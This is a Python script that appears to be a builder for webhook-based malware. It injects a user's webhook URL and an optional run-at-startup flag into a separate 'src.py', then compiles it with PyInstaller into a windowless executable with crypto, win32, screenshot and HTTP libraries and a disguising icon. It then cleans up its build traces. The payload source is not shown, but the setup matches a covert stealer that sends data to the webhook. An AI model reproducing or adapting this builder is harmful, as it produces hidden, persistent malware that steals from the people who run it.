import subprocess
import os
import shutil

def remove_dirs(filename):
    dirs = ["./build", "./__pycache__", "./dist"]
    files = [f"{filename}.spec", "filled_script.py"]
    for file in files:
        try:
            os.remove(file)
        except:
            pass
    for dir in dirs:
        try:
            shutil.rmtree(dir)
        except:
            pass

def insert_webhook_and_build_exe(webhook, output_file, startup, icon_path=None):
    with open("src.py", "r") as file:
        content = file.read()

    if startup:
        init_update = content.replace("{webhook_placeholder}", f'{webhook}')
        updated_content = init_update.replace('"{startup_placeholder}"', "True")
    else:
        init_update = content.replace("{webhook_placeholder}", f'{webhook}')
        updated_content = init_update.replace('"{startup_placeholder}"', "False")        

    with open("filled_script.py", "w") as file:
        file.write(updated_content)

    command = [
        'pyinstaller',
        '--onefile', '--clean', '--noconsole',
        '--hidden-import', 'pyautogui',
        '--hidden-import', 'pycryptodome',
        '--hidden-import', 'pywin32',
        '--hidden-import', 'requests',
        '--name', output_file,
        'filled_script.py'
    ]

    if icon_path:
        command.extend(['--icon', icon_path])

    subprocess.run(command)

    # Get the path of the directory above the working directory
    parent_dir = os.path.abspath(os.path.join(os.getcwd(), os.pardir))

    # Move the created .exe file to the directory above the working directory
    exe_file = f"{output_file}.exe"  # assuming the output_file name is used for the .exe file
    shutil.move(os.path.join("dist", exe_file), os.path.join(parent_dir, exe_file))

    remove_dirs(output_file)

user_webhook = input("Enter your webhook: ")
output_file = input("Enter the output file name (without extension): ")
icon_path = input("Enter the path to your icon file (.ico format), or press Enter to use the default: ")
startup_choice = input("Do you want to add the program to startup? (y/n): ")
if startup_choice.lower() == 'y':
    startup_add = True
else:
    startup_add = False
insert_webhook_and_build_exe(user_webhook, output_file, startup_add, icon_path if icon_path else None)
